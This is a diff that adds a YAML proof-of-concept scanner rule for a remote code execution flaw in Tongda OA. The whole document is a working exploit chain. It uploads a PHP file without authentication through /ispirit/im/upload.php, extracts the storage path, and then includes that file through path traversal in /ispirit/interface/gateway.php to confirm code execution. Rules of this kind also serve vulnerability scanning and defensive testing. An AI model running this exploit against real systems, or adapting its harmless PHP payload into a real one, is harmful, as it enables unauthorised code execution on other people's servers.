@@ -1,0 +1,40 @@
+name: poc-yaml-tongda-rce
+set:
+  random: randomLowercase(10)
+rules:
+  - method: POST
+    path: /ispirit/im/upload.php
+    headers:
+      Content-Type: multipart/form-data; boundary=8a7bbfd1e2c5480d8ab74d10a575ab01
+    body: |-
+      --8a7bbfd1e2c5480d8ab74d10a575ab01
+      Content-Disposition: form-data; name="P"
+
+      1
+      --8a7bbfd1e2c5480d8ab74d10a575ab01
+      Content-Disposition: form-data; name="DEST_UID"
+
+      1
+      --8a7bbfd1e2c5480d8ab74d10a575ab01
+      Content-Disposition: form-data; name="UPLOAD_MODE"
+
+      2
+      --8a7bbfd1e2c5480d8ab74d10a575ab01
+      Content-Disposition: form-data; name="ATTACHMENT"; filename="{{random}}"
+
+      <?php var_dump({{random}});?>
+
+      --8a7bbfd1e2c5480d8ab74d10a575ab01--
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(b"[vm]")
+    search: '\+OK \[vm\]\d+@(?P<fir>\d+?)_(?P<sec>\d+?)\|'
+  - method: POST
+    path: /ispirit/interface/gateway.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      json=%7B%22url%22%3A%22%2Fgeneral%2F..%2F..%2Fattach%2Fim%2F{{fir}}%2F{{sec}}.{{random}}%22%7D
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(bytes(random))
